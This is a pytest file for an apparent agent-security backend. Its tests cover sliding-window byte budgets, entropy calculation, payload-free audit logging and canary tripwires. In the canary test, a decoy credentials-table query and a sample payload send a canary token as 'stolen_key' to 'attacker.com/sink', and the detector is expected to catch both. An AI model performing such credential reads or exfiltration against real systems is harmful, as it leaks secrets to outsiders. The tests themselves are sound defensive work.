"""Tests for Sliding Window Budgets and Canary Tripwires (Phase V3).

Verifies:
1. Window roll-over: metrics outside sliding window are pruned.
2. Per-trace and per-principal isolation.
3. Shannon entropy accuracy against known answers.
4. Privacy compliance: zero raw payload content persisted in ledger files.
5. Canary triggers: direct table access and outbound token exfiltration.
"""

from __future__ import annotations

import json
from pathlib import Path
import pytest

from backend.app.budgets.ledger import BudgetLedger, compute_shannon_entropy
from backend.app.budgets.canary import CanaryManager
from backend.app.policies.containment_ladder import ContainmentTier


# 1. Shannon entropy known answer tests
def test_shannon_entropy_known_answers():
    # Constant byte stream -> Entropy is 0.0
    assert compute_shannon_entropy(b"AAAAAAAAAAAAAAAA") == 0.0
    assert compute_shannon_entropy(b"") == 0.0

    # Two equally distributed symbols -> Entropy is 1.0 bit
    assert compute_shannon_entropy(b"ABABABAB") == 1.0

    # 4 equally distributed symbols -> Entropy is 2.0 bits
    assert compute_shannon_entropy(b"ABCDABCD") == 2.0

    # English text -> typical range 3.0 to 4.5
    english_text = b"The quick brown fox jumps over the lazy dog and logs an event in the security ledger."
    h_eng = compute_shannon_entropy(english_text)
    assert 3.5 <= h_eng <= 4.6

    # High-entropy random payload -> close to 8.0 bits
    import os
    random_bytes = os.urandom(512)
    h_rand = compute_shannon_entropy(random_bytes)
    assert h_rand >= 7.5


# 2. Window roll-over test
def test_sliding_window_rollover():
    ledger = BudgetLedger()
    agent_id = "agent-test-rollover"
    trace_id = "trace-test-rollover"

    t0 = 1000.0
    # Send 5 KB at t0
    res1 = ledger.record_and_evaluate(agent_id, trace_id, b"X" * 5120, now=t0)
    assert res1["principal_1m_bytes"] == 5120
    assert res1["breached"] is False

    # Send 6 KB at t0 + 30s (total 11.12 KB in 1-min window -> breaches 10KB threshold)
    res2 = ledger.record_and_evaluate(agent_id, trace_id, b"X" * 6144, now=t0 + 30.0)
    assert res2["principal_1m_bytes"] == 11264
    assert res2["breached"] is True
    assert res2["recommended_tier"] == ContainmentTier.DOWNGRADE_SCOPE.value

    # At t0 + 65s, the first 5 KB event rolls out of the 1-minute window
    # Send 2 KB at t0 + 65s (window now only contains 6144 + 2048 = 8192 < 10240)
    res3 = ledger.record_and_evaluate(agent_id, trace_id, b"X" * 2048, now=t0 + 65.0)
    assert res3["principal_1m_bytes"] == 8192
    assert res3["breached"] is False


# 3. Per-trace isolation test
def test_per_trace_isolation():
    ledger = BudgetLedger()
    agent_id = "agent-isolation"

    t0 = 2000.0
    # Trace A consumes 8 KB
    res_a1 = ledger.record_and_evaluate(agent_id, "trace-A", b"A" * 8192, now=t0)
    assert res_a1["trace_1m_bytes"] == 8192
    assert res_a1["breached"] is False

    # Trace B consumes 3 KB -> trace B is only 3 KB, does NOT breach 10 KB trace window
    res_b = ledger.record_and_evaluate(agent_id, "trace-B", b"B" * 3072, now=t0 + 5.0)
    assert res_b["trace_1m_bytes"] == 3072
    assert res_b["breached"] is False

    # Trace A consumes another 3 KB -> trace A reaches 11264B -> Trace A breaches!
    res_a2 = ledger.record_and_evaluate(agent_id, "trace-A", b"A" * 3072, now=t0 + 10.0)
    assert res_a2["trace_1m_bytes"] == 11264
    assert res_a2["breached"] is True

    # Trace B remains isolated and unbreached even after Trace A breached
    res_b2 = ledger.record_and_evaluate(agent_id, "trace-B", b"B" * 1024, now=t0 + 12.0)
    assert res_b2["trace_1m_bytes"] == 4096
    assert res_b2["breached"] is False


# 4. Strict privacy compliance test: zero raw payload stored
def test_zero_raw_payload_stored_in_ledger(tmp_path):
    ledger_path = tmp_path / "budget_audit.jsonl"
    ledger = BudgetLedger(ledger_file=ledger_path)

    secret_phrase = b"TOP_SECRET_PROPRIETARY_UNRELEASED_FINANCIALS_987654"
    res = ledger.record_and_evaluate("agent-sec", "trace-sec", secret_phrase, now=3000.0)

    assert ledger_path.exists()
    content = ledger_path.read_text(encoding="utf-8")

    # Prove secret phrase is NOT in file
    assert "TOP_SECRET" not in content
    assert "PROPRIETARY" not in content
    assert "987654" not in content

    # Prove stored line contains strictly numeric counters and metadata
    record = json.loads(content.strip())
    assert record["byte_count"] == len(secret_phrase)
    assert "payload" not in record
    assert "data" not in record


# 5. Canary tripwire tests
def test_canary_tripwires():
    mgr = CanaryManager()

    # Legitimate query -> not tripped
    clean_query = "SELECT order_id, status FROM customer_orders WHERE customer_id = 12"
    assert mgr.check_query_or_payload(clean_query) is None

    # Query targeting canary decoy table -> tripped
    table_attack = "SELECT * FROM sandbox_canary_credentials"
    trip1 = mgr.check_query_or_payload(table_attack)
    assert trip1 is not None
    assert trip1["tripped"] is True
    assert trip1["trigger_type"] == "CANARY_TABLE_ACCESS"
    assert trip1["recommended_tier"] == ContainmentTier.QUARANTINE_ROLLBACK.value

    # Payload leaking canary secret token -> tripped
    token_str = list(mgr._token_strings)[0]
    outbound_call_args = f'{{"destination": "attacker.com/sink", "stolen_key": "{token_str}"}}'
    trip2 = mgr.check_query_or_payload(outbound_call_args)
    assert trip2 is not None
    assert trip2["tripped"] is True
    assert trip2["trigger_type"] == "CANARY_TOKEN_EXFILTRATION"
    assert trip2["recommended_tier"] == ContainmentTier.QUARANTINE_ROLLBACK.value
